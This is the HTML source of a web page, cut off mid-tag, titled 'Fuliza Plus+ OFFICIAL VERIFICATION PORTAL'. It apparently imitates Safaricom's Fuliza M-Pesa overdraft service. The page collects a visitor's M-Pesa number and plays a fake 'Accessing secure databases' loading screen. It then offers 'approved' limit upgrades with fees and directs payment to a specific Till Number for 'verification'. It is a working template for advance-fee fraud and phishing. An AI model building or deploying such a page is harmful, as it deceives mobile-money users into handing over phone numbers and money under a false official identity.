<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FulizaBoost</title>
<style>
body{font-family:Arial;background:#f4f6f8;margin:0}
.container{padding:20px}
.card{background:#fff;padding:25px;border-radius:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.08)}
h1{margin:10px 0}
p{color:#666}
input{width:100%;padding:15px;border-radius:12px;border:1px solid #ddd;margin-top:10px;font-size:16px}
button{width:100%;padding:15px;border:none;border-radius:12px;background:#1f9d4a;color:#fff;font-size:16px;margin-top:15px;font-weight:bold}
.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;margin-top:15px}
.limit{background:#fff;padding:20px;border-radius:15px;text-align:center;cursor:pointer;border:2px solid transparent}
.limit.active{border-color:#1f9d4a}
.fee{font-size:12px;color:#888}
.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;justify-content:center;align-items:center}
.modal-box{background:#fff;width:90%;border-radius:20px;overflow:hidden}
.modal-header{background:#1f9d4a;color:#fff;padding:20px;font-weight:bold}
.modal-body{padding:20px}
.modal-body p{background:#e9f7ef;padding:15px;border-radius:10px;font-size:14px}
.row{display:flex;gap:10px;margin-top:15px}
.row button{flex:1}
.cancel{background:#eee;color:#333}
.loader{border:4px solid #eee;border-top:4px solid #1f9d4a;border-radius:50%;width:50px;height:50px;margin:auto;animation:spin 1s linear infinite}
@keyframes spin{100%{transform:rotate(360deg)}}
.hidden{display:none}
</style>
</head>
<body><div class="container" id="start">
<div class="card">
<h1>Fuliza Plus+</h1>
<p>OFFICIAL VERIFICATION PORTAL</p>
<input id="phone" placeholder="Enter M-Pesa Number">
<button onclick="startProcess()">Check My Eligibility</button>
</div>
</div><div class="container hidden" id="loading">
<div class="card">
<div class="loader"></div>
<h3 id="loadingText">Connecting...</h3>
<p>Accessing secure databases...</p>
</div>
</div><div class="container hidden" id="success">
<div class="card">
<h2>Congratulations!</h2>
<p id="result"></p>
<button onclick="showLimits()">Proceed to Upgrade Limit</button>
</div>
</div><div class="container hidden" id="limits">
<h2>Select Your New Approved Limit</h2>
<div class="grid" id="grid"></div>
<button onclick="openModal()">UPGRADE</button>
</div><div class="modal" id="modal">
<div class="modal-box">
<div class="modal-header" id="modalTitle"></div>
<div class="modal-body">
<p>Enter your Safaricom number for VERIFICATION! Once payment to Till Number <b>6363781</b
